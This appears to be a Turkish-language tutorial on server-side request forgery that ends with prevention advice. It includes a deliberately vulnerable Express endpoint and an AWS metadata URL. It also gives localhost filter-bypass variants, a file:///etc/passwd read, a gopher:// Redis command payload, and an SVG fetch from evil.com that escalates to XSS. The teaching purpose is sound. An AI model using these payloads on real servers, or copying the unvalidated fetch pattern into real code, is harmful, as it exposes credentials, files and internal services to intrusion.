# Server-Side Request Forgery
Bir web sunucusu, kullanıcı girdisine bağlı olarak uzak kaynakları getiriyorsa, saldırgan bu sunucuyu kendi belirlediği URL’lere istek göndermeye zorlayabilir. İlk bakışta bu çok kritik görünmese de, web uygulamasının yapılandırmasına bağlı olarak SSRF zafiyetleri çok ciddi sonuçlara yol açabilir. Ayrıca, eğer web uygulaması kullanıcıdan gelen URL şemasına veya protokolüne güveniyorsa, saldırgan URL şemasını manipüle ederek daha da istenmeyen davranışlara sebep olabilir. Örneğin, SSRF zafiyetlerinin istismarında yaygın olarak kullanılan URL şemalarından biri:
- gopher://: Belirtilen adrese rastgele byte’lar gönderebilir. Saldırgan bunu kullanarak keyfi HTTP POST istekleri gönderebilir veya SMTP sunucuları ya da veritabanları gibi diğer servislerle iletişim kurabilir.

Yaygın sömürü yolları:
- Cloud Meta Verilerine Erişim
- Sunucudaki dosyaları sızdırmak
- Ağ keşfi
- Ağdaki belirli hizmetlere paketler göndermek, genellikle başka bir sunucuda Uzaktan Komuta Yürütme elde etmek için

# SSRF Keşfi
Örnek: Bir sunucu bir URL almak için kullanıcı girişini kabul eder.
```js
const express = require('express');
const axios = require('axios');
const app = express();
const port = 3000;

app.get('/user/image', async function (req, res) {
  const imgUrl = req.body.imgUrl;
  const imageReq = await axios.get(imgUrl);
  user.updateProfileImage(imageReq.data);
  res.send(imageReq.data);
});

app.listen(port, () => {
  console.log(`Listening on http://localhost:${port}`);
});
```

saldırgan aşağıdaki gibi girdi sağlar:
```
http://169.254.169.254/latest/meta-data/
```

Bu, AWS EC2 meta veri hizmetinden hassas bilgileri alır.

# Filtreleri atlamak
```
http://localhost:80
http://localhost:22
https://localhost:443
http://127.0.0.1:80
http://127.0.0.1:22
https://127.0.0.1:443
http://0.0.0.0:80
http://0.0.0.0:22
https://0.0.0.0:443
http://[::]:80/
http://[0000::1]:80/
http://[0:0:0:0:0:ffff:127.0.0.1]
http://[::ffff:127.0.0.1]
http://127.127.127.127
http://127.0.1.3
http://127.0.0.0
http://0/
http://127.1
http://127.0.1
```

Prefix/Suffix tabanlı bypasslar ve URL manipülasyon teknikleri için:
- https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet

# LFI ve SSRF
SSRF zafiyetlerinde, uygulamaya sağlanan URL’nin bir parçası yerel dosya sistemine erişim için kullanılabilir. Özellikle file:// şeması, web sunucusunun yerel dosyaları okumasına olanak sağlar.

Örnek olarak, sunucu imgUrl parametresini fetch etmek için kullanıyorsa, saldırgan aşağıdaki URL’yi sağlayabilir:
```
file:///etc/passwd
```

Bu, sunucudaki hassas dosyaların içeriğini döndürebilir ve uygulamanın normal işleyişi dışında information disclosure sağlar.

# Gopher Protokolü ve SSRF
Gopher, HTTP’ye benzer şekilde sunucular arasında veri iletimi için kullanılan eski bir protokoldür. SSRF zafiyetlerinde özellikle tehlikelidir, çünkü saldırganlar sadece GET/POST değil, keyfi protokoller ve ham paketler gönderebilir.

Neden tehlikeli:
- HTTP POST veya diğer protokolleri taklit edebilir.
- SMTP, Redis, gibi arka uç servisleri ile iletişim kurabilir.

## Örnek kullanım
Bir SSRF zafiyeti olan uygulama, kullanıcıdan aldığı URL’yi fetch ediyorsa, saldırgan şu URL’yi verebilir:
```
gopher://127.0.0.1:6379/_SET%20key%20123
```
Bu örnekte:
- 127.0.0.1:6379 → Redis sunucusu
- _SET key 123 → Redis komutu, Gopher protokolü üzerinden gönderiliyor

Sunucu bu isteği gönderebilir ve internal servislere komut çalıştırabilir.

Aşağıdaki hizmetler gopher tarafındandesteklenir:
- MySQL
- PostgreSQL
- FastCGI
- Redis
- SMTP
- Zabbix
- pymemcache
- rbmemcache
- phpmemcache
- dmpmemcache

Aşağıdaki tool gopher ile exploiti kolaylaştırabilir.
- https://github.com/tarunkant/Gopherus

# XSS'e yükseltme
Javascript kodu içeren bir SVG dosyası dahil ederek SSRF'yi bir XSS'ye yükseltmeyi deneyebilirsiniz.
```
https://example.com/ssrf.php?url=http://evil.com/poc.svg
```

# SSRF Önleme Yöntemleri
SSRF zafiyetlerini tamamen önlemek için uygulama seviyesinde birden fazla önlem bir arada uygulanmalıdır:
1. Kullanıcı Girdilerini Doğrulama
- Kullanıcıdan gelen URL’leri veya hostname’leri mutlaka whitelist ile kontrol edin.
- Sadece izin verilen domain veya IP’lere erişime izin verin.

2. URL Şemalarını Kısıtlama
- Sadece HTTP ve HTTPS gibi güvenli protokolleri kabul edin. 
- file://, gopher://, ftp:// gibi potansiyel tehlikeli protokolleri reddedin.

3. Dahili Kaynaklara Erişimi Kısıtlama
- Sunucunun internal network’e veya metadata servislerine doğrudan erişimi mümkün olduğunca kısıtlayın.
- Cloud ortamlarında meta-data servisini sadece gerekli servislerin kullanabileceği şekilde yapılandırın.
